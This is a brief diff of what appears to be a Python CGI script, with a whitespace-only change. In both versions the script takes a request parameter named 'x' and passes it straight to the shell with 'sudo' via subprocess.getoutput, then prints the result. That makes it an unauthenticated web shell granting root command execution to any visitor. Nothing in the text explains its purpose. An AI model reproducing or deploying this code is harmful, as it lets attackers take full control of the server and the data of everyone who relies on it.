@@ -8,5 +8,7 @@ print()
 
 fs = cgi.FieldStorage()
 c = fs.getvalue("x")
-op = subprocess.getoutput("sudo " + c)
+
+
+op = subprocess.getoutput("sudo " +c)
 print(op)
